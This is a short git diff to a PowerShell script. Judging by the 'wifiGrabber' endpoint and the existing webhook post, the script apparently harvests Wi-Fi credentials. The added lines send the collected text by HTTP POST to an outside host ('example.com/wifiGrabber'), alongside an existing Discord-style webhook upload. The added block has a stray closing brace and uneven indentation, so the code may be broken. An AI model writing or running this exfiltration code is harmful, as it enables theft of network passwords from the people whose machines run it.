@@ -50,6 +50,17 @@ $Body = @{
   'content' = $text
 }
 
+$uri = "https://example.com/wifiGrabber"
+    
+    # Prepare the header with the content type set to JSON
+    $headers = @{
+        "Content-Type" = "application/json"
+    }
+
+    # Send the JSON data via POST method
+    Invoke-RestMethod -Uri $uri -Method Post -Body $text -Headers $headers
+}
+
 if (-not ([string]::IsNullOrEmpty($text))){
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
 
